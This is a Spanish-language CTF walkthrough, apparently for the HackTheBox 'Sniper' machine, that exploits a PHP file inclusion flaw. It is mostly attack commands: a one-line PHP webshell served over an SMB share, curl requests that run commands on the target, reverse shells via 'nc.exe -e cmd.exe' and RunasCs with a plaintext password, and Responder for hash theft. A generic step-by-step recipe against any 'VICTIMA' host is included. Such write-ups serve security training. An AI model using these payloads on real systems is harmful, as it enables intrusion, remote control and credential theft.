# WEB

File Inclusion encontrado

<img width="1235" height="673" alt="image" src="https://github.com/user-attachments/assets/c4cc2ac3-f5ac-48c5-960a-e96d57c54063" />

Es una regla fija de PHP, no algo de Sniper. PHP siempre nombra sus ficheros de sesión como sess_ + el valor de tu cookie PHPSESSID. Sin excepción.

Entonces para lograr RCE: 

Tu cookie PHPSESSID vale, por ejemplo, 923nktm0vmmi12qrptls332t5o.
→ Tu fichero se llama sess_923nktm0vmmi12qrptls332t5o

<img width="1575" height="787" alt="image" src="https://github.com/user-attachments/assets/1df53e49-9f3c-4fd7-9580-2295bbad019a" />
<img width="1251" height="744" alt="image" src="https://github.com/user-attachments/assets/770bffce-38de-4f37-a012-bfef51e4f8a4" />
En el username ponemos  

````
<?=`whoami`?>
````
1) Crea el webshell y compártelo por SMB (en la carpeta donde tienes nc.exe, ~/Desktop):

cd ~/Desktop
printf '%s' '<?=`$_GET[0]`?>' > shell.php
cat shell.php

Tiene que mostrar exactamente: <?=$_GET[0]?>

2) Levanta el servidor SMB (deja la terminal abierta):

impacket-smbserver share ~/Desktop -smb2support

3) Prueba ejecución de comandos (en otra terminal):

curl "http://10.129.229.6/blog/?lang=//10.10.14.65/share/shell.php&0=whoami"

<img width="898" height="733" alt="image" src="https://github.com/user-attachments/assets/1a345f22-b3d5-486d-8573-63f1209eb1f2" />
<img width="576" height="173" alt="image" src="https://github.com/user-attachments/assets/7bde6421-141a-4238-ac76-51468ea5ad6d" />
RUTA:
Paso 0 — Confirmar el LFI

curl "http://VICTIMA/RUTA/?PARAM=/windows/win.ini"

Si ves el contenido del win.ini → tienes LFI. (Si falla, prueba ../../../../windows/win.ini.)

Paso 1 — Montar webshell + SMB en tu Kali (una vez)

cd ~/Desktop
printf '%s' '<?=`$_GET[0]`?>' > shell.php     # webshell: el comando va en el parámetro 0
cp /usr/share/windows-binaries/nc.exe ~/Desktop/ 2>/dev/null   # ten nc.exe aquí
impacket-smbserver share ~/Desktop -smb2support               # deja esta terminal abierta

Paso 2 — RFI: conseguir ejecución de comandos

curl -G "http://VICTIMA/RUTA/" \
  --data-urlencode 'PARAM=//ATACANTE/share/shell.php' \
  --data-urlencode '0=whoami'

Si ves el usuario (ej. nt authority\iusr) → RCE. Cambiando 0= ejecutas lo que quieras.

Paso 3 — Shell

# terminal 1: listener
nc -lvnp 443

# terminal 2: ejecutar nc desde tu share
curl -G "http://VICTIMA/RUTA/" \
  --data-urlencode 'PARAM=//ATACANTE/share/shell.php' \
  --data-urlencode '0=\\ATACANTE\share\nc.exe -e cmd.exe ATACANTE 443'

<img width="793" height="251" alt="image" src="https://github.com/user-attachments/assets/5b7958c9-6856-439b-89b9-3289a60450f0" />
Nos pasamos runas para cambiar de user

````
wget https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip -O /tmp/RunasCs.zip
unzip /tmp/RunasCs.zip -d ~/Desktop/
ls ~/Desktop/RunasCs.exe
````
````
nc -lvnp 4444
````
````
\\10.10.14.65\share\RunasCs.exe Chris "36mEAhz/B8xQ~2VM" cmd.exe -r 10.10.14.65:4444
````
<img width="733" height="221" alt="image" src="https://github.com/user-attachments/assets/462187a5-94c5-48f9-a1aa-d0d4e12b3c81" />
Vemos una nota rara
<img width="1881" height="312" alt="image" src="https://github.com/user-attachments/assets/0ca69172-586f-493a-b154-6593782de86d" />
Vemos que el admin abrirá el archivo vamos a coger su hash
````
sudo responder -I tun0
````
La escalada se va del niveo de la OSCP
